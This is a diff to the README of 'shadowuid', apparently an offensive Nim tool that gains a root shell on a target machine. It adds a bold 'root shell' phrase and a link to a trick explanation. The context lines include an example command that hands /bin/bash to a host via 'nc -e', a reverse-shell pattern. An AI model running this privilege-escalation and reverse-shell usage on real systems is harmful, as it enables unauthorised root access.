@@ -10,7 +10,7 @@ Also a good way to learn Nim and something new
 * First transfer `shadowuid` on target
 * Run it!<br><pre><code>./shadowuid</code></pre>
 
-And that's all, obtaining root shell is obtained and process to obtain it again will be outputted 
+And that's all, **root shell** is obtained and process to obtain it again will be outputted 
 
 
 ##### More granular
@@ -20,3 +20,6 @@ An example:
 ```shell
 ./shadowuid -x --command "nc 127.0.0.2 -e /bin/bash"
 ```
+
+
+## [Understand the trick](TRICK.md)
